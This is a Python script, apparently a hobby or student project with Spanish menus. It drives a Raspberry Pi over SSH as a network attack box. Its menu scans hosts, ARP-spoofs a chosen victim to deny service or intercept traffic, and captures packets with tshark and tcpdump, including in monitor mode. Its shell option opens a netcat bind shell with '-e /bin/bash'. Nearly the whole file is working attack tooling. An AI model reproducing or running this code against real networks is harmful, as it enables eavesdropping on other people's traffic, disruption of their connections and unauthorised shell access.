import time
import paramiko
import colorama
import subprocess
import requests
from colorama import Fore,Style,Back
import keyboard
import threading


HOST='192.168.1.100'
USER='pi'
YELLOW = "\x1b[1;33;40m"
RED = "\x1b[1;31;40m"
hosts=list()
macs=list()
pid_ataque=0
client=paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST,username='pi')
gw='d'






def sniffmon(nombrearchivo):
    my_command =f"sudo tshark -i wlan0 -I  -w - | tee {nombrearchivo}.pcap | tshark -r -"
    stdin, stdout, stderr = client.exec_command(my_command)
    try:
        while True:
            if keyboard.is_pressed('q'):
                break
            line = stdout.readline()
            if not line:
                break
            print(line, end="")
    except KeyboardInterrupt:
        print("fff")

    sftp = client.open_sftp()
    sftp.get(fr"{nombrearchivo}.pcap",fr"..\capturas\{nombrearchivo}.pcap")  # cambiar el tipo de barra dependiendo de si el sistema es linux o windows
    sftp.close()




def sniff(nombrearchivo):
    my_command =f"sudo tcpdump 'tcp port 80'  -w - | tee {nombrearchivo}.pcap | tshark -r -"
    stdin, stdout, stderr = client.exec_command(my_command)
    try:
        while True:
            if keyboard.is_pressed('q'):
                break
            line = stdout.readline()
            if not line:
                break
            print(line, end="")
    except KeyboardInterrupt:
        print("fff")

    sftp = client.open_sftp()
    sftp.get(fr"{nombrearchivo}.pcap",fr"..\capturas\{nombrearchivo}.pcap")  # cambiar el tipo de barra dependiendo de si el sistema es linux o windows
    sftp.close()


def mostrar_menu():
    print('''
    1)lanzar escaneo de red
    2)arp spoofing(denegacion de servicio)
    3)arp spoofing(sniffing)
    4)sniffing en modo monitor
    5)SHELL
          '''
          )

def mostrar_escaneo(opcion):


    if opcion==1:

        print(f"Mostrando escaneo  de {len(hosts)} hosts")
        print(f'NUMERO:	    IP	                MAC	                    VENDOR')
        print("__________________________________________________________________________")
        for i in range(len(hosts)):
            print(f'{i}:	{hosts[i]}	{macs[i]}	{getvendor(macs[i])}')
    else:
        print(f"Mostrando escaneo  de {len(hosts)} hosts")
        print(f'NUMERO:	    IP	                MAC	                    ')
        print("________________________________________________________")
        for i in range(len(hosts)):
            print(f'{i}:	{hosts[i]}	{macs[i]}')

def escaneo(client):
    if len(hosts)!=0:
        print("Ya hay un escaneo realizado,¿quieres hacer otro escaneo?")
        eleccion=input('S=SI\nN=NO\n')
        if eleccion=='s':
            stdin, stdout, stderr = client.exec_command('sudo python3 project/arpspoof.py')
            parsear_escaneo(stdout.read().decode())
            mostrar_escaneo(0)


    else:
        stdin, stdout, stderr = client.exec_command('sudo python3 project/arpspoof.py')
        parsear_escaneo(stdout.read().decode())
        mostrar_escaneo(0)

    pass

def shell():

    client.exec_command("nc -lvp 4444 -e /bin/bash")
    subprocess.Popen(f"nc {HOST} 4444", shell=True, stdout=subprocess.PIPE)


def getvendor(mac):
    header = {"User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"}
    r = requests.get(f'http://macvendors.co/api/vendorname/{mac}', headers=header)
    return (r.text)

def parsear_escaneo(cadena):
    cadena=cadena.strip()
    a = cadena.split('\n')[0]
    b = cadena.split('\n')[1]

    listaips = a.split(',')
    listamacs = b.split(',')

    for i in listamacs:
        macs.append(i.split("'")[1])

    for i in listaips:
        hosts.append(i.split("'")[1])



def get_gateway():
    stdin, stdout, stderr=client.exec_command("sudo python3 project/server.py --eleccion=gateway")
    gw=stdout.read().decode()
    return gw.rstrip('\n')

def spoof(victima):
    gw=get_gateway()
    stdin, stdout, stderr = client.exec_command(
        f'  sudo python3 project/server.py --eleccion=atacar --ipvictima={hosts[victima]} --macvictima={macs[victima]} --ipgw={gw}  --macgw={macs[hosts.index(gw)]} &'
)

if __name__ == '__main__':
    colorama.init()


######  CONEXION POR SSH Y ESCANEO YA PARSEADO
    print(get_gateway())
    stdin, stdout, stderr=client.exec_command('sudo python3 project/server.py --eleccion=scan ')#se realiza un escaneo nada mas comenzar
    parsear_escaneo(stdout.read().decode())


    while 1:
        mostrar_menu()
        cmd = input(Fore.RED + "raspberry" + Fore.WHITE + "$")
        Fore.WHITE
        if cmd=='1':
            mostrar_escaneo(0)
            #escaneo(client)
        if cmd=="2":
            mostrar_escaneo(0)
            victima = input("SELECCIONA VICTIMA  \n$")
            t=threading.Thread(name='spoofthread',target=spoof(int(victima)))
            t.start()

            #spoof(int(victima))
        if cmd=="3":
            mostrar_escaneo(0)
            victima = input("SELECCIONA VICTIMA  \n$")
            spoof(int(victima))
            name=input("como quieres llamar al archihvo de la captura\n")
            sniff(name.rstrip('\n'))

        if cmd=='4':

            name = input("como quieres llamar al archihvo de la captura\n")
            print("sniffing en modo monitor")
            sniffmon(name.rstrip('\n'))
        if cmd=='5':
            shell()












